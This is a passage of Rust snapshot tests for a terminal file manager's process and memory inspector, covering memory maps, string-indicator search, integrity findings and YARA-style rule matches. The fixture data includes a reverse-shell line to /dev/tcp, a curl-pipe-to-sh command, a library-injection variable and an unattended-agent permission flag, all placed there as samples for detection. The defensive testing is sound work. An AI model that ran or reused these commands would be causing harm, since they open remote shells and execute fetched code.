    for page in [ActivityPage::Processes, ActivityPage::Memory, ActivityPage::Regions, ActivityPage::Snapshot] {
        stage.state.activity.page = page;
        for (cols, rows) in [(0, 0), (1, 1), (12, 6), (44, 14), (193, 40)] {
            stage.send(Msg::Resize { cols, rows });
            stage.render(stage.started)?;
        }
    }
    Ok(())
}

#[test]
fn memory_macos_protects_is_marked_explained_and_offers_no_administrator() -> Result<()> {
    use borg_core::{ActivityData, ActivityRequest, MemoryProtection, MemoryRegion};
    let mut stage = activity_stage()?;
    let process = stage.state.activity.selected.unwrap();
    for p in stage.state.activity.sample.processes.iter_mut().filter(|p| p.key == process) {
        p.protection = Some(MemoryProtection::HardenedRuntime);
    }
    stage.send(key(KeyCode::Tab));
    let buffer = stage.render(stage.started)?;
    ensure_text(&buffer, "Memory protected · Hardened Runtime")?;
    check("activity_memory_protected", &stage, buffer)?;
    stage.send(key(KeyCode::Tab)).send(key(KeyCode::Enter));
    let id = stage.state.activity.pending.as_ref().unwrap().0;
    let region = MemoryRegion {
        start: 0x100000000,
        end: 0x100040000,
        permissions: "rw-".into(),
        name: "Heap · application buffers".into(),
        resident: Some(163840),
        ..Default::default()
    };
    stage.send(Msg::Activity { id, result: Ok(ActivityData::Regions(vec![region])) });
    stage.send(key(KeyCode::Enter)).send(key(KeyCode::Enter));
    let (id, request) = stage.state.activity.pending.clone().unwrap();
    anyhow::ensure!(matches!(request, ActivityRequest::Capture { .. }), "{request:?}");
    stage.send(Msg::Activity { id, result: Err("Cannot inspect this process: macOS protects its memory".into()) });
    let buffer = stage.render(stage.started)?;
    ensure_text(&buffer, "macOS protects this process's memory")?;
    ensure_text(&buffer, "Hardened Runtime")?;
    anyhow::ensure!(!describe(&buffer).contains("A Administrator"), "{}", describe(&buffer));
    check("activity_memory_protected_preview", &stage, buffer)?;
    Ok(())
}

/// Bytes as varied as `bits` bits each, near enough: `2^bits` values taken in turn.
fn entropy_of(bits: u32) -> Option<borg_view::entropy::Entropy> {
    let values: Vec<u8> = (0..1u32 << bits).map(|value| value as u8).collect();
    Some(borg_view::entropy::Entropy::of(&values))
}

#[test]
fn activity_page_map_shows_what_each_page_of_a_region_holds() -> Result<()> {
    use borg_core::{ActivityData, ActivityRequest, CensusPage, MemoryCensus, MemoryRegion, PageClass};
    let mut stage = activity_stage()?;
    stage.send(key(KeyCode::Tab)).send(key(KeyCode::Enter));
    let id = stage.state.activity.pending.as_ref().unwrap().0;
    let process = stage.state.activity.selected.unwrap();
    let region = MemoryRegion {
        start: 0x100000000,
        end: 0x100000000 + 64 * 4096,
        permissions: "rw-".into(),
        name: "Heap · application buffers".into(),
        ..Default::default()
    };
    stage.send(Msg::Activity { id, result: Ok(ActivityData::Regions(vec![region.clone()])) });
    stage.send(key(KeyCode::Char('m'))).send(key(KeyCode::Enter)).send(key(KeyCode::Enter));
    let Some((id, ActivityRequest::Census { .. })) = stage.state.activity.pending.clone() else {
        panic!("the map should ask for a census")
    };
    let runs = [
        (PageClass::Pointers, 8, entropy_of(5)),
        (PageClass::Text, 12, entropy_of(4)),
        (PageClass::Wide, 4, entropy_of(4)),
        (PageClass::Zero, 16, entropy_of(0)),
        (PageClass::Dense, 4, entropy_of(8)),
        (PageClass::Data, 12, entropy_of(6)),
        (PageClass::Filler, 4, entropy_of(0)),
        (PageClass::Absent, 4, None),
    ];
    let pages = runs
        .iter()
        .flat_map(|&(class, count, entropy)| std::iter::repeat_n(CensusPage { class, entropy }, count))
        .collect();
    let census =
        MemoryCensus { process, start: region.start, end: region.end, page: 4096, stride: 1, pages, residency: true };
    stage.send(Msg::Activity { id, result: Ok(ActivityData::Census(census)) });
    for _ in 0..10 {
        stage.send(key(KeyCode::Right));
    }
    let buffer = stage.render(stage.started)?;
    ensure_text(&buffer, "0x10000a000 · text · 4 bits per byte")?;
    ensure_text(&buffer, "high entropy 6%")?;
    ensure_text(&buffer, "media, archives and keys")?;
    ensure_text(&buffer, "highest 8 bits per byte")?;
    check("activity_page_map", &stage, buffer)?;
    let classic = stage.state.appearance.choices().iter().position(|c| c.id == "classic").unwrap();
    stage.state.appearance.select(classic, stage.started, Duration::ZERO);
    let buffer = stage.render(stage.started)?;
    check("activity_page_map_classic", &stage, buffer)?;
    for (cols, rows) in [(0, 0), (1, 1), (12, 6), (44, 14), (193, 40)] {
        stage.send(Msg::Resize { cols, rows });
        stage.render(stage.started)?;
    }
    Ok(())
}

#[test]
fn activity_page_map_marks_packed_code_whatever_its_kind() -> Result<()> {
    use borg_core::{ActivityData, ActivityRequest, CensusPage, MemoryCensus, MemoryRegion, PageClass};
    let mut stage = activity_stage()?;
    stage.send(key(KeyCode::Tab)).send(key(KeyCode::Enter));
    let id = stage.state.activity.pending.as_ref().unwrap().0;
    let process = stage.state.activity.selected.unwrap();
    let region = MemoryRegion {
        start: 0x100000000,
        end: 0x100000000 + 64 * 4096,
        permissions: "r-x".into(),
        name: "/opt/tool/bin/tool".into(),
        ..Default::default()
    };
    stage.send(Msg::Activity { id, result: Ok(ActivityData::Regions(vec![region.clone()])) });
    stage.send(key(KeyCode::Char('m'))).send(key(KeyCode::Enter)).send(key(KeyCode::Enter));
    let Some((id, ActivityRequest::Census { .. })) = stage.state.activity.pending.clone() else {
        panic!("the map should ask for a census")
    };
    let runs = [
        (PageClass::Code, 24, entropy_of(6)),
        (PageClass::Code, 28, Some(borg_view::entropy::Entropy::of(&(0..=255).collect::<Vec<u8>>()))),
        (PageClass::Zero, 8, entropy_of(0)),
        (PageClass::Absent, 4, None),
    ];
    let pages = runs
        .iter()
        .flat_map(|&(class, count, entropy)| std::iter::repeat_n(CensusPage { class, entropy }, count))
        .collect();
    let census =
        MemoryCensus { process, start: region.start, end: region.end, page: 4096, stride: 1, pages, residency: true };
    stage.send(Msg::Activity { id, result: Ok(ActivityData::Census(census)) });
    for _ in 0..30 {
        stage.send(key(KeyCode::Right));
    }
    let buffer = stage.render(stage.started)?;
    ensure_text(&buffer, "0x10001e000 · code · 8 bits per byte")?;
    ensure_text(&buffer, "high entropy 44%")?;
    check("activity_page_map_packed_code", &stage, buffer)
}

#[test]
fn activity_files_tabs_and_scrolled_regions_keep_selection_visible() -> Result<()> {
    use borg_core::{ActivityData, MemoryRegion, Pointer, ProcessFile, ProcessFiles};
    use crossterm::event::{MouseButton, MouseEvent, MouseEventKind};
    let mut stage = activity_stage()?;
    stage.send(key(KeyCode::Char('2')));
    let id = stage.state.activity.pending.as_ref().unwrap().0;
    stage.send(Msg::Activity {
        id,
        result: Ok(ActivityData::Files(ProcessFiles {
            entries: vec![
                ProcessFile {
                    descriptor: "3".into(),
                    access: "rw".into(),
                    kind: "REG".into(),
                    name: "/workspace/demo/session.log".into(),
                    size: Some(8192),
                    offset: Some(512),
                },
                ProcessFile {
                    descriptor: "4".into(),
                    access: "rw".into(),
                    kind: "IPv4".into(),
                    name: "127.0.0.1:8080 (LISTEN)".into(),
                    size: None,
                    offset: None,
                },
                ProcessFile {
                    descriptor: "cwd".into(),
                    access: String::new(),
                    kind: "DIR".into(),
                    name: "/workspace/demo".into(),
                    size: None,
                    offset: None,
                },
            ],
            skipped: 0,
        })),
    });
    let buffer = stage.render(stage.started)?;
    check("activity_files", &stage, buffer)?;
    let path = std::path::PathBuf::from("/workspace/demo/session.log");
    let log = "09:00:01 session started\n09:00:02 listening on 127.0.0.1:8080\n09:00:07 GET /status 200\n";
    let pager = borg_view::Pager::for_path(std::sync::Arc::new(log.as_bytes().to_vec()), &path, 60, 20)?;
    stage.send(Msg::Peeked(borg_core::Peeked {
        aside: borg_core::Aside::OpenFile,
        path,
        at: None,
        peek: borg_core::Peek::Text(pager),
    }));
    let buffer = stage.render(stage.started)?;
    ensure_text(&buffer, "09:00:01 session started")?;
    ensure_text(&buffer, "F3 View")?;
    check("activity_file_preview", &stage, buffer)?;
    let shot = Snapshot::from_buffer(stage.render(stage.started)?, &stage.palette, None);
    let (column, row) = shot.find("1 Memory").unwrap();
    let event =
        MouseEvent { column, row, kind: MouseEventKind::Down(MouseButton::Left), modifiers: KeyModifiers::NONE };
    let msg = borg_ui::mouse_input(&stage.state, event, false, stage.started).unwrap();
    stage.send(msg);
    let id = stage.state.activity.pending.as_ref().unwrap().0;
    stage.send(Msg::Activity {
        id,
        result: Ok(ActivityData::Regions(
            (0..60)
                .map(|i| MemoryRegion {
                    start: 0x1000 + i * 0x1000,
                    end: 0x2000 + i * 0x1000,
                    permissions: "rw-".into(),
                    name: format!("Heap allocation {i:03}"),
                    resident: Some(1024),
                    private: None,
                    shared: None,
                    swap: None,
                    ..Default::default()
                })
                .collect(),
        )),
    });
    stage.send(key(KeyCode::Char('g'))).send(key(KeyCode::End));
    let before = Snapshot::from_buffer(stage.render(stage.started)?, &stage.palette, None);
    let list_row = |shot: &Snapshot, name: &str| {
        shot.lines()
            .iter()
            .position(|line| line.chars().take(usize::from(shot.cols() / 2)).collect::<String>().contains(name))
            .unwrap()
    };
    let bottom = list_row(&before, "Heap allocation 059");
    stage.send(key(KeyCode::Up));
    let buffer = stage.render(stage.started)?;
    let after = Snapshot::from_buffer(buffer.clone(), &stage.palette, None);
    assert_eq!(list_row(&after, "Heap allocation 058"), bottom - 1);
    check("activity_scrolled_regions", &stage, buffer)?;
    let (column, row) = after.find("Heap allocation 057").unwrap();
    let event =
        MouseEvent { column, row, kind: MouseEventKind::Down(MouseButton::Left), modifiers: KeyModifiers::NONE };
    let msg = borg_ui::mouse_input(&stage.state, event, false, stage.started).unwrap();
    assert!(matches!(msg, Msg::Pointer(Pointer::ActivityRow { index: 57, .. })));
    stage.send(msg);
    assert_eq!(stage.state.activity.selected_region().unwrap().name, "Heap allocation 057");
    stage.send(key(KeyCode::Char('2')));
    assert_eq!(stage.state.activity.files[0].descriptor, "3");
    for (cols, rows) in [(0, 0), (1, 1), (12, 6), (44, 14)] {
        stage.send(Msg::Resize { cols, rows });
        stage.render(stage.started)?;
    }
    Ok(())
}

#[test]
fn activity_narrow_layout_mouse_sort_and_selection() -> Result<()> {
    use borg_core::{ActivitySort, Pointer};
    use crossterm::event::{MouseButton, MouseEvent, MouseEventKind};
    let mut stage = activity_stage()?;
    let buffer = stage.render(stage.started)?;
    let shot = Snapshot::from_buffer(buffer, &stage.palette, None);
    let (column, row) = shot.find("RAM ↓").unwrap();
    let event =
        MouseEvent { column, row, kind: MouseEventKind::Down(MouseButton::Left), modifiers: KeyModifiers::NONE };
    let msg = borg_ui::mouse_input(&stage.state, event, false, stage.started).unwrap();
    assert!(matches!(msg, Msg::Pointer(Pointer::ActivitySort(ActivitySort::Memory))));
    stage.send(msg);
    assert!(!stage.state.activity.reverse);
    let buffer = stage.render(stage.started)?;
    let shot = Snapshot::from_buffer(buffer, &stage.palette, None);
    let (column, row) = shot.find("language-server").unwrap();
    let msg = borg_ui::mouse_input(&stage.state, MouseEvent { column, row, ..event }, true, stage.started).unwrap();
    stage.send(msg);
    assert_eq!(stage.state.activity.process().unwrap().name, "language-server");
    stage.send(key(KeyCode::Esc));
    stage.send(Msg::Resize { cols: 44, rows: 14 });
    let buffer = stage.render(stage.started)?;
    check("activity_narrow", &stage, buffer)
}

#[test]
fn activity_tree_folds_branches_and_the_overview_shows_the_process_tree() -> Result<()> {
    use borg_core::{ActivityData, ActivityRequest, ProcessInfo, ProcessKey, SystemSample};
    const SAMPLE_WITH_WORKERS: u64 = 1_000;
    let mut stage = activity_stage()?;
    let mut processes = stage.state.activity.sample.processes.clone();
    let worker = |pid: u32, name: &str, parent: u32, ram: u64| ProcessInfo {
        key: ProcessKey { pid, start: 200 },
        name: name.into(),
        parent: Some(parent),
        resident: Some(ram),
        cpu: Some(10120),
        ..processes[0].clone()
    };
    processes
        .extend([worker(1749116, "build-worker", 410, 480_000_000), worker(1749117, "linker", 1749116, 96_000_000)]);
    let id = stage.state.activity.pending.as_ref().map_or(SAMPLE_WITH_WORKERS, |pending| pending.0);
    stage.state.activity.pending = Some((id, ActivityRequest::Sample));
    let sample = SystemSample { processes, ..stage.state.activity.sample.clone() };
    stage.send(Msg::Activity { id, result: Ok(ActivityData::Sample(sample)) });
    stage.send(key(KeyCode::Char('t')));
    let buffer = stage.render(stage.started)?;
    ensure_text(&buffer, "1749116 101.2")?;
    ensure_text(&buffer, "▾ compiler")?;
    ensure_text(&buffer, "Process tree")?;
    check("activity_tree", &stage, buffer)?;
    stage.send(key(KeyCode::Left));
    let buffer = stage.render(stage.started)?;
    ensure_text(&buffer, "▸ compiler · 3 processes")?;
    check("activity_tree_folded", &stage, buffer)?;
    stage.send(key(KeyCode::Right)).send(key(KeyCode::Down)).send(key(KeyCode::Down)).send(key(KeyCode::Down));
    let buffer = stage.render(stage.started)?;
    assert_eq!(stage.state.activity.process().unwrap().name, "linker");
    ensure_text(&buffer, "1749117 linker")?;
    check("activity_tree_family", &stage, buffer)
}

#[test]
fn borg_brand_is_visible_in_panels_console_viewer_and_overlays() -> Result<()> {
    let mut stage = stage(SIZE, Motion::STILL)?;
    let verify = |stage: &Stage, buffer: Buffer| {
        let shot = Snapshot::from_buffer(buffer, &stage.palette, None);
        assert!(shot.lines().last().unwrap().contains("Borg Commander"));
    };
    let buffer = stage.render(stage.started)?;
    verify(&stage, buffer);
    stage.send(key(KeyCode::F(1)));
    let buffer = stage.render(stage.started)?;
    verify(&stage, buffer);
    stage.send(key(KeyCode::Esc)).send(ctrl('o'));
    let buffer = stage.render(stage.started)?;
    verify(&stage, buffer);
    stage.send(ctrl('o'));
    stage.state.screensaver = true;
    let buffer = stage.render(stage.started)?;
    verify(&stage, buffer);
    stage.state.screensaver = false;
    let pager = borg_view::Pager::new(std::sync::Arc::new(b"Brand in the viewer".to_vec()), 88, 20)?;
    opened(&mut stage, borg_core::Viewer::new("/workspace/sample.txt".into(), borg_core::Content::Text(pager)));
    let buffer = stage.render(stage.started)?;
    verify(&stage, buffer);
    stage.send(key(KeyCode::Esc));
    for cols in [1, 4, 10, 44, 193] {
        stage.send(Msg::Resize { cols, rows: 20 });
        stage.render(stage.started)?;
    }
    Ok(())
}

#[test]
fn memory_search_form_results_and_match_preview_in_split_panes() -> Result<()> {
    use borg_core::{
        ActivityData, ActivityPage, ActivityRequest, MemoryHit, MemoryRegion, MemorySearchMode, MemorySearchReport,
        MemorySnapshot, Pointer,
    };
    use crossterm::event::{MouseButton, MouseEvent, MouseEventKind};
    let mut stage = activity_stage()?;
    stage.send(key(KeyCode::Tab)).send(key(KeyCode::Char('/')));
    stage.send(Msg::Paste("Borg".into()));
    stage.state.activity.search_form.as_mut().unwrap().mode = MemorySearchMode::Unicode;
    let buffer = stage.render(stage.started)?;
    check("memory_search_form", &stage, buffer)?;
    stage.send(key(KeyCode::Enter));
    let id = stage.state.activity.pending.as_ref().unwrap().0;
    let process = stage.state.activity.selected.unwrap();
    let region = MemoryRegion {
        start: 0x100000000,
        end: 0x100040000,
        permissions: "rw-".into(),
        name: "Heap · application buffers".into(),
        resident: None,
        private: None,
        shared: None,
        swap: None,
        ..Default::default()
    };
    stage.send(Msg::Activity {
        id,
        result: Ok(ActivityData::Search(MemorySearchReport {
            process,
            hits: vec![
                MemoryHit {
                    address: region.start + 32,
                    length: 4,
                    encoding: "UTF-8".into(),
                    region: region.clone(),
                    ..Default::default()
                },
                MemoryHit {
                    address: region.start + 128,
                    length: 8,
                    encoding: "UTF-16LE".into(),
                    region: region.clone(),
                    ..Default::default()
                },
                MemoryHit {
                    address: region.start + 256,
                    length: 16,
                    encoding: "UTF-32BE".into(),
                    region: region.clone(),
                    ..Default::default()
                },
            ],
            scanned: 12_000_000,
            total: 120_000_000,
            skipped: 0,
            next: Some(region.end),
            cancelled: false,
            strings: None,
        })),
    });
    let buffer = stage.render(stage.started)?;
    check("memory_search_results", &stage, buffer.clone())?;
    let shot = Snapshot::from_buffer(buffer, &stage.palette, None);
    let (column, row) = shot.find("UTF-16LE").unwrap();
    let msg = borg_ui::mouse_input(
        &stage.state,
        MouseEvent { column, row, kind: MouseEventKind::Down(MouseButton::Left), modifiers: KeyModifiers::NONE },
        false,
        stage.started,
    )
    .unwrap();
    assert!(matches!(msg, Msg::Pointer(Pointer::ActivityRow { index: 1, preview: false, .. })));
    stage.send(msg).send(key(KeyCode::Enter));
    let (id, ActivityRequest::Capture { region: window, .. }) = stage.state.activity.pending.clone().unwrap() else {
        panic!("match should request its surrounding bytes")
    };
    assert_eq!(window.start, region.start + 96);
    let mut bytes = vec![0; 200];
    bytes[32..40].copy_from_slice(&[0x42, 0, 0x6f, 0, 0x72, 0, 0x67, 0]);
    stage.send(Msg::Activity {
        id,
        result: Ok(ActivityData::Snapshot(MemorySnapshot { process, address: window.start, bytes, captured: 1 })),
    });
    let buffer = stage.render(stage.started)?;
    check("memory_search_preview", &stage, buffer)?;
    stage.send(Msg::Key(KeyEvent::new(KeyCode::Char('w'), KeyModifiers::ALT)));
    let buffer = stage.render(stage.started)?;
    check("memory_search_maximized", &stage, buffer)?;
    assert_eq!(stage.state.activity.page, ActivityPage::Snapshot);
    for (cols, rows) in [(0, 0), (1, 1), (44, 14), (193, 40)] {
        stage.send(Msg::Resize { cols, rows });
        stage.render(stage.started)?;
    }
    Ok(())
}

#[test]
fn memory_indicators_list_strings_by_what_they_look_like() -> Result<()> {
    use borg_core::{
        ActivityData, Indicator, MemoryHit, MemoryRegion, MemorySearchMode, MemorySearchReport, StringsTally,
    };
    let mut stage = activity_stage()?;
    stage.send(key(KeyCode::Tab)).send(key(KeyCode::Char('/')));
    stage.state.activity.search_form.as_mut().unwrap().mode = MemorySearchMode::Indicators;
    stage.state.activity.search_form.as_mut().unwrap().selected = 1;
    let buffer = stage.render(stage.started)?;
    ensure_text(&buffer, "Indicators · URLs, addresses, commands, secrets")?;
    stage.send(key(KeyCode::Enter));
    let id = stage.state.activity.pending.as_ref().unwrap().0;
    let process = stage.state.activity.selected.unwrap();
    let region = MemoryRegion {
        start: 0x100000000,
        end: 0x100040000,
        permissions: "rw-".into(),
        name: "Heap · application buffers".into(),
        ..Default::default()
    };
    // Ranked as a search ranks them: only in memory ahead of what a file holds too.
    let found = [
        (0x1200, Indicator::Secret, "token=shop-test-0000-not-a-real-token", 1, false),
        (0x1c0, Indicator::Command, "/bin/sh -c 'curl -s https://cdn.example.net/x | sh'", 1, false),
        (0x40, Indicator::Url, "https://updates.example.com/v2/check", 3, false),
        (0x9a0, Indicator::Ip, "listening on 10.0.0.5:8080", 1, false),
        (0x400, Indicator::Path, "/home/me/shop/config/settings.toml", 12, true),
    ];
    let hits = found
        .iter()
        .map(|&(offset, indicator, text, copies, in_file)| MemoryHit {
            address: region.start + offset,
            length: text.len(),
            encoding: "ASCII".into(),
            region: region.clone(),
            text: Some(text.into()),
            indicator: Some(indicator),
            copies,
            places: (0..copies.min(2)).map(|copy| (region.start + offset + copy * 0x8000, 0)).collect(),
            in_file: Some(in_file),
        })
        .collect();
    let strings = StringsTally {
        found: 18,
        distinct: 5,
        kinds: found.iter().map(|&(_, kind, ..)| (kind, 1)).collect(),
        memory_only: 4,
        files: 23,
        regions: vec![region.clone()],
    };
    stage.send(Msg::Activity {
        id,
        result: Ok(ActivityData::Search(MemorySearchReport {
            process,
            hits,
            scanned: 120_000_000,
            total: 120_000_000,
            skipped: 0,
            next: None,
            cancelled: false,
            strings: Some(strings),
        })),
    });
    let buffer = stage.render(stage.started)?;
    ensure_text(&buffer, "• /bin/sh -c")?;
    ensure_text(&buffer, "C Next copy")?;
    check("memory_indicators", &stage, buffer)
}

#[test]
fn integrity_findings_lead_with_alerts_and_mark_their_evidence() -> Result<()> {
    use borg_core::{
        ActivityData, ActivityRequest, Finding, FindingKind, IntegrityReport, MemoryRegion, MemorySnapshot, Severity,
    };
    let mut stage = activity_stage()?;
    stage.send(key(KeyCode::Tab)).send(key(KeyCode::Enter));
    let id = stage.state.activity.pending.as_ref().unwrap().0;
    let process = stage.state.activity.selected.unwrap();
    let code = MemoryRegion {
        start: 0x100440000,
        end: 0x100480000,
        permissions: "r-x".into(),
        name: "__TEXT · /usr/local/bin/compiler".into(),
        path: Some("/usr/local/bin/compiler".into()),
        ..Default::default()
    };
    let anonymous = MemoryRegion {
        start: 0x300000000,
        end: 0x300010000,
        permissions: "rwx".into(),
        name: "VM_ALLOCATE".into(),
        ..Default::default()
    };
    stage.send(Msg::Activity { id, result: Ok(ActivityData::Regions(vec![code.clone(), anonymous.clone()])) });
    stage.send(key(KeyCode::Char('i')));
    let Some((id, ActivityRequest::Integrity { .. })) = stage.state.activity.pending.clone() else {
        panic!("I should check integrity")
    };
    stage.send(Msg::MemorySearchProgress { id, scanned: 48_000_000, total: 96_000_000, hits: 2 });
    let buffer = stage.render(stage.started)?;
    ensure_text(&buffer, "Checking integrity · 46M/92M · 2 findings")?;
    let finding = |kind, severity, detail: &str, region: Option<&MemoryRegion>, address, length| Finding {
        kind,
        severity,
        detail: detail.into(),
        region: region.cloned(),
        address,
        length,
        note: None,
    };
    let findings = vec![
        finding(
            FindingKind::CodeChanged,
            Severity::Alert,
            "1 of 64 pages differ from /usr/local/bin/compiler · first at +0x1a40: e9 7b 3c 00 00 90 90 90 in memory, 55 48 89 e5 41 57 41 56 on disk",
            Some(&code),
            Some(0x100441a40),
            8,
        ),
        finding(
            FindingKind::HiddenImage,
            Severity::Alert,
            "Mach-O header in VM_ALLOCATE",
            Some(&anonymous),
            Some(0x300000000),
            4,
        ),
        finding(
            FindingKind::UnbackedCode,
            Severity::Alert,
            "64K rwx in VM_ALLOCATE",
            Some(&anonymous),
            Some(0x300000000),
            0,
        ),
        finding(
            FindingKind::Preload,
            Severity::Warning,
            "DYLD_INSERT_LIBRARIES=/home/me/.cache/libhook.dylib",
            None,
            None,
            0,
        ),
        finding(
            FindingKind::NameMismatch,
            Severity::Notice,
            "Named compiler, runs /usr/local/bin/compiler-driver",
            None,
            None,
            0,
        ),
    ];
    let report = IntegrityReport {
        process,
        findings,
        compared: 48_000_000,
        uncompared: 0,
        scanned: 512_000_000,
        unbacked: 640_000_000,
        unreadable: 0,
        complete: false,
    };
    stage.send(Msg::Activity { id, result: Ok(ActivityData::Integrity(report)) });
    stage.send(key(KeyCode::Enter));
    let Some((id, ActivityRequest::Capture { region, .. })) = stage.state.activity.pending.clone() else {
        panic!("Enter should preview the finding's evidence")
    };
    let mut bytes = vec![0x90; 256];
    bytes[32..37].copy_from_slice(&[0xe9, 0x7b, 0x3c, 0x00, 0x00]);
    stage.send(Msg::Activity {
        id,
        result: Ok(ActivityData::Snapshot(MemorySnapshot { process, address: region.start, bytes, captured: 1 })),
    });
    let buffer = stage.render(stage.started)?;
    ensure_text(&buffer, "Code differs from its file")?;
    check("activity_integrity", &stage, buffer)?;
    stage.send(key(KeyCode::Tab));
    for _ in 0..3 {
        stage.send(key(KeyCode::Down));
    }
    let buffer = stage.render(stage.started)?;
    ensure_text(&buffer, "This finding is about the process as a whole")?;
    check("activity_integrity_process", &stage, buffer)
}

#[test]
fn rule_matches_in_memory_show_their_evidence_and_what_else_explains_them() -> Result<()> {
    use borg_core::{ActivityData, ActivityRequest, MemoryRegion, MemorySnapshot, RulesReport};
    use borg_rules::{Evidence, Level, Problem, RuleMatch};
    let mut stage = activity_stage()?;
    stage.send(key(KeyCode::Tab)).send(key(KeyCode::Enter));
    let id = stage.state.activity.pending.as_ref().unwrap().0;
    let process = stage.state.activity.selected.unwrap();
    let heap = MemoryRegion {
        start: 0x600000000,
        end: 0x600800000,
        permissions: "rw-".into(),
        name: "MALLOC_LARGE".into(),
        ..Default::default()
    };
    stage.send(Msg::Activity { id, result: Ok(ActivityData::Regions(vec![heap.clone()])) });
    let buffer = stage.render(stage.started)?;
    ensure_text(&buffer, "Y Rules")?;
    stage.send(key(KeyCode::Char('y')));
    let Some((id, ActivityRequest::Rules { .. })) = stage.state.activity.pending.clone() else {
        panic!("Y should scan with rules")
    };
    stage.send(Msg::MemorySearchProgress { id, scanned: 48_000_000, total: 96_000_000, hits: 2 });
    let buffer = stage.render(stage.started)?;
    ensure_text(&buffer, "Scanning with rules · 46M/92M · 2 matches")?;

    let found = |rule: &str, namespace: &str, level, offset, bytes: &[u8]| RuleMatch {
        rule: rule.into(),
        namespace: namespace.into(),
        level,
        description: Some("Pastebin raw links, where droppers fetch their next stage".into()),
        false_positives: Some("Developers share snippets this way".into()),
        evidence: Some(Evidence { string: "$a".into(), offset, length: bytes.len() as u64, bytes: bytes.to_vec() }),
    };
    let user = "/home/me/.config/borg-commander/rules/droppers.yar";
    let mut findings = vec![
        borg_core::rule_finding(
            &found(
                "reverse_shell",
                borg_rules::BUILT_IN,
                Level::Alert,
                0x1a40,
                b"bash -i >& /dev/tcp/203.0.113.7/4444 0>&1",
            ),
            &heap,
            0x600000000,
        ),
        borg_core::rule_finding(
            &found("agent_unattended", borg_rules::BUILT_IN, Level::Warning, 0x8000, b"--dangerously-skip-permissions"),
            &heap,
            0x600000000,
        ),
        borg_core::rule_finding(
            &found("Pastebin_Raw", user, Level::Notice, 0x20, b"pastebin.com/raw/"),
            &heap,
            0x600400000,
        ),
    ];
    let broken =
        Problem { file: "/home/me/.config/borg-commander/rules/old.yar".into(), message: "syntax error".into() };
    findings.push(borg_core::problem_finding(&broken));
    let report = RulesReport {
        process,
        findings,
        rules: 17,
        scanned: 96_000_000,
        total: 96_000_000,
        unreadable: 0,
        complete: true,
    };
    stage.send(Msg::Activity { id, result: Ok(ActivityData::Rules(report)) });
    stage.send(key(KeyCode::Enter));
    let Some((id, ActivityRequest::Capture { region, .. })) = stage.state.activity.pending.clone() else {
        panic!("Enter should preview the match")
    };
    let mut bytes = vec![0; 256];
    let shell = b"bash -i >& /dev/tcp/203.0.113.7/4444 0>&1";
    bytes[32..32 + shell.len()].copy_from_slice(shell);
    stage.send(Msg::Activity {
        id,
        result: Ok(ActivityData::Snapshot(MemorySnapshot { process, address: region.start, bytes, captured: 1 })),
    });
    let buffer = stage.render(stage.started)?;
    ensure_text(&buffer, "Rule matches")?;
    ensure_text(&buffer, "$a matched")?;
    check("activity_rules", &stage, buffer)?;
    stage.send(key(KeyCode::Tab));
    for _ in 0..3 {
        stage.send(key(KeyCode::Down));
    }
    let buffer = stage.render(stage.started)?;
    ensure_text(&buffer, "Left out /home/me/.config/borg-commander/rules/old.yar")?;
    check("activity_rules_problem", &stage, buffer)
}

#[test]
fn expanded_size_tree_accounts_for_files_outside_child_directories() -> Result<()> {
    let mut stage = size_tree_stage()?;
    stage.send(key(KeyCode::Right)).send(key(KeyCode::Right));
    let buffer = stage.render(stage.started)?;
    let shot = Snapshot::from_buffer(buffer.clone(), &stage.palette, None);
    assert!(shot.contains("Files in this folder"));
    check("size_tree_direct_files", &stage, buffer)
}

#[test]
fn background_sizes_stay_in_normal_panels_with_progress_and_stop_action() -> Result<()> {
    let mut stage = stage(GridSize { cols: 132, rows: 28 }, Motion::STILL)?;
    stage.send(Msg::Key(KeyEvent::new(KeyCode::Char('i'), KeyModifiers::ALT)));
    let id = stage.state.sizing.as_ref().unwrap().id;
    stage.send(Msg::SizeProgress { id, progress: borg_core::SearchProgress { visited: 15238, ..Default::default() } });
    let mut measured = entry("src", EntryKind::Dir, 45200000, RECENT, false);
    measured.source = Some("/home/me/projects/borg/src".into());
    measured.usage =
        Some(borg_vfs::FolderUsage { files: 410, folders: 24, measured: at(RECENT), ..Default::default() });
    stage.send(Msg::Sized { id, entries: vec![measured] });
    assert_eq!(stage.state.active_panel().dir(), std::path::Path::new("/home/me/projects/borg"));
    assert_eq!(stage.state.active_panel().entries().iter().find(|e| e.name == "src").unwrap().size, 45200000);
    let buffer = stage.render(stage.started + Duration::from_secs(1))?;
    assert!(!stage.state.active_panel().is_results());
    assert!(stage.state.overlay.is_none());
    let shot = Snapshot::from_buffer(buffer.clone(), &stage.palette, None);
    assert!(shot.contains("43M"));
    assert!(shot.contains("Sizes · 15238 scanned"));
    assert!(shot.contains("Alt-I Stop sizes"));
    check("background_sizes", &stage, buffer)?;
    stage.send(Msg::Resize { cols: 44, rows: 14 });
    let buffer = stage.render(stage.started + Duration::from_secs(1))?;
    check("background_sizes_narrow", &stage, buffer)?;
    Ok(())
}

fn container(
    id: &str,
    project: Option<&str>,
    service: &str,
    state: borg_docker::State,
    status: &str,
) -> borg_docker::Container {
    borg_docker::Container {
        id: format!("{id}{}", "0".repeat(60)),
        name: project.map_or_else(|| service.to_owned(), |p| format!("{p}-{service}-1")),
        image: format!("{service}:1.4"),
        command: "docker-entrypoint.sh".into(),
        created: "2026-10-20 09:12:44 +0000 UTC".into(),
        state,
        status: status.into(),
        ports: if service == "web" { "0.0.0.0:8080->80/tcp".into() } else { String::new() },
        networks: project.map_or_else(|| "bridge".into(), |p| format!("{p}_default")),
        project: project.map(str::to_owned),
        service: project.map(|_| service.to_owned()),
        project_dir: project.map(|p| format!("/home/me/projects/{p}")),
        config_files: project.map(|p| vec![format!("/home/me/projects/{p}/compose.yaml")]).unwrap_or_default(),
    }
}

/// Wide enough for the Docker list to show CPU now beside the average.
const DOCKER_WIDE: GridSize = GridSize { cols: 132, rows: 34 };
/// Narrow enough for the Docker list to show the average alone.
const DOCKER_NARROW: GridSize = GridSize { cols: 80, rows: 34 };

fn resize(stage: &mut Stage, size: GridSize) {
    stage.send(Msg::Resize { cols: size.cols, rows: size.rows });
    stage.emulator.resize(GridSize::console(size.cols, size.rows));
}

/// The Docker view over made-up projects: a list of projects and containers on the left,
/// the selected container's details and live CPU and memory on the right.
#[test]
fn docker_lists_projects_and_shows_container_details() -> Result<()> {
    use borg_core::{DockerData, DockerRequest};
    use borg_docker::{Details, Mount, Network, State, Stats};
    let mut stage = stage(DOCKER_WIDE, Motion::STILL)?;
